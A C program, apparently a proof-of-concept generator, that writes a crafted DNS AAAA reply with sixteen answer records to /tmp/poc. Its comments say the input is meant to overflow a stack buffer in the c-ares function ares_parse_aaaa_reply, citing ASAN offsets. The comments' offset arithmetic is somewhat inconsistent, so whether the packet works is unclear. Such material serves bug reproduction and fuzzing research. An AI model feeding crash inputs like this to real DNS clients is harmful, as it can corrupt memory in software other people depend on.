#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Construct a malformed DNS AAAA reply that triggers stack buffer overflow in ares_parse_aaaa_reply */
    /* The function parses a DNS response; we need to craft a packet that causes writing beyond the 'info' buffer (40 bytes at offset 64) */
    /* Based on ASAN output: overflow at offset 108 from frame base, which is 4 bytes past 'info' (size 40 at offset 64) */
    /* We need to write 4 bytes at offset 108 (i.e., bytes 108-111 from frame start) */
    /* The 'info' buffer is 40 bytes (64-103), so overflow writes at 108-111 (4 bytes) */
    /* Craft a DNS response with many address records to trigger overflow */

    /* DNS header: ID, flags, questions, answers, authority, additional */
    /* Set up a response with many AAAA answers */
    
    /* Write DNS header */
    unsigned char header[] = {
        0x00, 0x00, /* ID */
        0x84, 0x00, /* flags: response, no error */
        0x00, 0x01, /* questions: 1 */
        0x00, 0x10, /* answers: 16 (to overflow) */
        0x00, 0x00, /* authority: 0 */
        0x00, 0x00  /* additional: 0 */
    };
    fwrite(header, 1, sizeof(header), f);

    /* Question section: query for AAAA record */
    /* Name: example.com (encoded as 7example3com0) */
    unsigned char question_name[] = {
        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e',
        0x03, 'c', 'o', 'm',
        0x00
    };
    fwrite(question_name, 1, sizeof(question_name), f);

    /* Question type AAAA (28) and class IN (1) */
    unsigned char question_tail[] = {
        0x00, 0x1c, /* type AAAA */
        0x00, 0x01  /* class IN */
    };
    fwrite(question_tail, 1, sizeof(question_tail), f);

    /* Answer section: 16 AAAA records */
    /* Each answer: name (pointer to question), type, class, TTL, rdlength, rdata */
    /* Use name pointer 0xc00c (offset 12 in packet) */
    unsigned char answer_header[] = {
        0xc0, 0x0c, /* name pointer */
        0x00, 0x1c, /* type AAAA */
        0x00, 0x01, /* class IN */
        0x00, 0x00, 0x00, 0x3c, /* TTL 60 */
        0x00, 0x10  /* rdlength: 16 bytes for IPv6 address */
    };

    /* IPv6 address: all zeros for simplicity */
    unsigned char ipv6_addr[16] = {0};

    for (int i = 0; i < 16; i++) {
        fwrite(answer_header, 1, sizeof(answer_header), f);
        fwrite(ipv6_addr, 1, 16, f);
    }

    fclose(f);
    return 0;
}